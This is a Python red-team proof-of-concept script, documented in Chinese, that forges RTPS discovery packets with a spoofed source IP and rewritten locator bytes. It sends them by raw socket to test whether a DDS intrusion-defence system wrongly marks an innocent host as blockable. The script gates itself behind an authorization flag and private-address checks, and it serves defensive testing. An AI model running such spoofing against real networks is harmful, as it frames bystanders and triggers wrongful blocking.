#!/usr/bin/env python3
"""N31：偽造來源位址，試圖讓防禦去封鎖一個無辜的位址。

⚠️ **需要 Jesse 對該次操作的明確授權，且需要攻擊機的 root（raw socket）。**
   這支會產生偽造來源位址的網路流量。不要在非隔離環境執行。

## 這在測什麼

`工具腳本/crosscheck_identity_attribution.py` 的封鎖判定原本有三條。前三條
**擋不住來源位址偽造**：

1. 攻擊者以**受害者的 IP** 為來源送出帶自己 GUID 的 RTPS
2. 握手必然失敗——防守方的回應依 ARP 送到受害者那裡去了
3. 觀測者記下 `UNAUTHORIZED`
4. 封包層把那個 GUID 綁到**受害者的 IP**

三條全部成立 → **系統宣告一個無辜主機可封鎖**，那是自動封鎖最糟的失效方向。

2026-08-31 加上第四條（鏈路層綁定）擋這件事，但那條規則**只有合成資料的
單元測試**。這支是去產生真實的偽造流量，看它在 live 下是否真的被擋下來。

**預期結果是防禦贏**：`link_layer_binding.json` 對被偽造的位址判
`spoofing_evidence`，`crosscheck.json` 判它**不可封鎖**。

## 為什麼要連 RTPS 酬載裡的 locator 一起改

Fast DDS 回應的是 SPDP **酬載裡宣告的 locator**，不是 IP 標頭的來源位址。
只改 IP 標頭的話，防守方仍然會回應到攻擊者真正的位址，於是被偽造的那個 IP
**沒有任何送出流量**——鏈路層檢查會判 `unverifiable`（無法驗證）而不是
`spoofing_evidence`（確證偽造）。兩者都不可封鎖，但只有後者證明檢查真的
認得出偽造。

真正想嫁禍的攻擊者本來就會兩個一起改，所以這也是比較真實的威脅模型。
做法是在酬載裡把攻擊者 IP 的 4 個位元組換成被偽造的 IP——locator 結構
內嵌的就是這 4 個原始位元組。

## 樣板從哪裡來

不自己組 RTPS。從一份**真實的擷取檔**取一個 SPDP 資料包當樣板，這樣
Wireshark 的 dissector 一定認得、GUID 一定是真的。可以用 N28 跑出來的
擷取檔，或既有的跨主機場次。

## 用法（在攻擊機上，需要 root）

    sudo python3 紅隊測試/PoC腳本/N31_source_address_spoof.py \\
        --template <某場>/traffic.pcapng \\
        --attacker-ip 192.168.0.30 \\
        --spoof-ip 192.168.0.200 \\
        --target-ip 192.168.0.129 \\
        --count 40 --interval 1.0 \\
        --i-have-authorization

`--spoof-ip` 必須是防守方**解析得到 MAC** 的位址，否則防守方連封包都送不
出去，測到的會是 `unverifiable`。安全的做法見 `文件/來源位址偽造加固_2026-08-31.md`
的執行步驟：在防守方加一筆靜態 ARP 指向一個捏造的 MAC，就不必動到任何
真實的第三方裝置。
"""

from __future__ import annotations

import argparse
import ipaddress
import os
import socket
import struct
import subprocess
import sys
import time
from pathlib import Path


def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i + 1]
    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    return ~total & 0xFFFF


def build_ip_udp(
    src: str, dst: str, sport: int, dport: int, payload: bytes
) -> bytes:
    """自己組 IP＋UDP 標頭，因為要指定一個不屬於本機的來源位址。"""
    udp_length = 8 + len(payload)
    pseudo = (
        socket.inet_aton(src)
        + socket.inet_aton(dst)
        + struct.pack("!BBH", 0, socket.IPPROTO_UDP, udp_length)
    )
    udp = struct.pack("!HHHH", sport, dport, udp_length, 0)
    udp_checksum = _checksum(pseudo + udp + payload)
    # UDP 校驗和為 0 代表「未計算」，所以 0 要送成 0xFFFF。
    udp = struct.pack(
        "!HHHH", sport, dport, udp_length, udp_checksum or 0xFFFF
    )

    total_length = 20 + udp_length
    ip = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, total_length, 0, 0, 64, socket.IPPROTO_UDP, 0,
        socket.inet_aton(src), socket.inet_aton(dst),
    )
    ip = ip[:10] + struct.pack("!H", _checksum(ip)) + ip[12:]
    return ip + udp + payload


def extract_template(
    capture: Path, attacker_ip: str
) -> tuple[bytes, int, int]:
    """從擷取檔取一個攻擊者送出的 RTPS 資料包當樣板。

    回傳 (UDP 酬載, 來源埠, 目的埠)。用真實封包而不是自己組，是為了讓
    Wireshark 的 dissector 一定認得、GUID 一定是真的。
    """
    argv = [
        "tshark", "-r", str(capture),
        "-Y", f"rtps and ip.src == {attacker_ip}",
        "-T", "fields",
        "-e", "udp.srcport", "-e", "udp.dstport", "-e", "data.data",
        "-e", "udp.payload",
        # 不要用 -c：它限制的是**讀取**的封包數，在 display filter
        # 之前套用，所以會變成「只看前 N 個封包裡有沒有」。實測那份
        # 擷取檔的攻擊者封包排在第 40 個之後，於是找不到樣板。
        "-E", "separator=|", "-E", "occurrence=f",
    ]
    try:
        completed = subprocess.run(
            argv, capture_output=True, text=True, check=True, timeout=300
        )
    except FileNotFoundError:
        raise SystemExit("⛔ 找不到 tshark。請安裝 wireshark-common。")
    except subprocess.CalledProcessError as error:
        raise SystemExit(f"⛔ tshark 失敗：{error.stderr[:400]}")

    for line in completed.stdout.splitlines():
        parts = line.split("|")
        if len(parts) != 4:
            continue
        sport, dport, data_hex, payload_hex = parts
        raw = (payload_hex or data_hex).replace(":", "").strip()
        if not raw or not sport or not dport:
            continue
        try:
            payload = bytes.fromhex(raw)
        except ValueError:
            continue
        if len(payload) < 40:
            continue
        return payload, int(sport), int(dport)

    raise SystemExit(
        f"⛔ 擷取檔裡找不到來自 {attacker_ip} 的 RTPS 封包，無法取樣板。"
    )


def rewrite_locators(
    payload: bytes, attacker_ip: str, spoof_ip: str
) -> tuple[bytes, int]:
    """把酬載裡的攻擊者 IP 換成被偽造的 IP。

    RTPS 的 locator 結構內嵌的是 4 個原始位元組，所以直接位元組替換就夠了。
    回傳 (新酬載, 替換次數)。替換 0 次代表這個樣板沒有內嵌 locator，
    防守方會回應到別的地方——呼叫端要據此停下來。
    """
    old = socket.inet_aton(attacker_ip)
    new = socket.inet_aton(spoof_ip)
    count = payload.count(old)
    return payload.replace(old, new), count


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--template", type=Path, default=None,
                        help="含有攻擊者 RTPS 封包的擷取檔，用來取樣板"
                             "（需要 tshark）")
    parser.add_argument("--template-hex", default=None,
                        help="直接給 UDP 酬載的十六進位。攻擊機因此不需要 "
                             "tshark 也不需要擷取檔——只要 Python 與 root。")
    parser.add_argument("--dest-port", type=int, default=None,
                        help="**通常必須指定。** 樣板裡的目的埠是取樣當時"
                             "防守方 participant 的埠，換一次 session 就會變。"
                             "送錯埠 Fast DDS 不會反應，於是沒有任何送往被"
                             "偽造位址的流量，測到的會是「無法驗證」而不是"
                             "「確證偽造」。用 ss -ulnp 在防守方查實際的埠。")
    parser.add_argument("--source-port", type=int, default=None,
                        help="偽造封包的來源埠，預設沿用樣板的")
    parser.add_argument("--attacker-ip", required=True,
                        help="攻擊機真正的 IPv4（要被換掉的那個）")
    parser.add_argument("--spoof-ip", required=True,
                        help="要偽造的來源 IPv4。防守方必須解析得到它的 MAC")
    parser.add_argument("--target-ip", required=True, help="防守方的 IPv4")
    parser.add_argument("--count", type=int, default=40)
    parser.add_argument("--interval", type=float, default=1.0)
    parser.add_argument("--i-have-authorization", action="store_true",
                        help="確認已取得 Jesse 對本次操作的明確授權")
    args = parser.parse_args()

    if not args.i_have_authorization:
        print("⛔ 這支會產生偽造來源位址的網路流量。", file=sys.stderr)
        print("   需要 Jesse 對該次操作的明確授權，並加上 "
              "--i-have-authorization。", file=sys.stderr)
        return 2

    for name, value in (("attacker", args.attacker_ip),
                        ("spoof", args.spoof_ip),
                        ("target", args.target_ip)):
        address = ipaddress.ip_address(value)
        if address.version != 4:
            print(f"⛔ {name} 位址必須是 IPv4", file=sys.stderr)
            return 2
        if not address.is_private:
            # 只在私有網段內測試。對外偽造來源位址是另一回事。
            print(f"⛔ {name} 位址 {value} 不在私有網段，拒絕執行",
                  file=sys.stderr)
            return 2

    if args.spoof_ip == args.target_ip:
        print("⛔ 偽造成防守方自己的位址沒有意義", file=sys.stderr)
        return 2
    if args.spoof_ip == args.attacker_ip:
        print("⛔ 偽造位址與攻擊者位址相同，等於沒有偽造", file=sys.stderr)
        return 2
    if args.count > 500:
        print("⛔ 上限 500 個封包。這是驗證檢查是否生效，不是壓力測試",
              file=sys.stderr)
        return 2
    if os.geteuid() != 0:
        print("⛔ 需要 root：偽造來源位址要 raw socket", file=sys.stderr)
        return 2

    if args.template_hex:
        try:
            payload = bytes.fromhex(args.template_hex.replace(":", "").strip())
        except ValueError:
            print("⛔ --template-hex 不是合法的十六進位", file=sys.stderr)
            return 2
        if payload[:4] != b"RTPS":
            print("⛔ 酬載開頭不是 RTPS。這不是一個 RTPS 資料包。",
                  file=sys.stderr)
            return 2
        sport, dport = 47470, 0
    elif args.template is not None:
        payload, sport, dport = extract_template(
            args.template, args.attacker_ip
        )
    else:
        print("⛔ 要 --template 或 --template-hex 其中一個", file=sys.stderr)
        return 2

    if args.source_port:
        sport = args.source_port
    if args.dest_port:
        dport = args.dest_port
    if not dport:
        print("⛔ 沒有目的埠。用 --dest-port 指定。", file=sys.stderr)
        print("   在防守方查：ss -ulnp | grep -E ':(149|74)[0-9]{2}'",
              file=sys.stderr)
        return 2
    spoofed, replaced = rewrite_locators(
        payload, args.attacker_ip, args.spoof_ip
    )
    if replaced == 0:
        print("⛔ 樣板酬載裡沒有內嵌攻擊者的 IP，代表它沒有宣告 locator。",
              file=sys.stderr)
        print("   只改 IP 標頭的話，防守方會回應到別的地方，被偽造的位址"
              "不會有送出流量——", file=sys.stderr)
        print("   測到的會是「無法驗證」而不是「確證偽造」。換一個樣板封包。",
              file=sys.stderr)
        return 1

    print("=== N31 來源位址偽造 ===")
    source = args.template if args.template else "--template-hex"
    print(f"  樣板      : {source}（{len(payload)} bytes，"
          f"{args.attacker_ip}:{sport} → :{dport}）")
    print(f"  酬載內 locator 替換：{replaced} 處")
    print(f"  偽造來源  : {args.spoof_ip}")
    print(f"  送往      : {args.target_ip}:{dport}")
    print(f"  數量      : {args.count}，間隔 {args.interval} 秒")
    print()
    print("  預期：防守方對 " + args.spoof_ip + " 判 spoofing_evidence、"
          "**不可封鎖**。")
    print("  若它被判成可封鎖，第四條就沒有生效——那是真實的漏洞。")
    print()

    datagram = build_ip_udp(
        args.spoof_ip, args.target_ip, sport, dport, spoofed
    )
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    sent = 0
    try:
        for index in range(args.count):
            sock.sendto(datagram, (args.target_ip, 0))
            sent += 1
            if (index + 1) % 10 == 0:
                print(f"    已送出 {index + 1}/{args.count}")
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\n  中斷")
    finally:
        sock.close()

    print(f"\n  送出 {sent} 個偽造來源的封包。")
    print("  現在到防守方跑 check_link_layer_binding.py 與 "
          "crosscheck_identity_attribution.py。")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
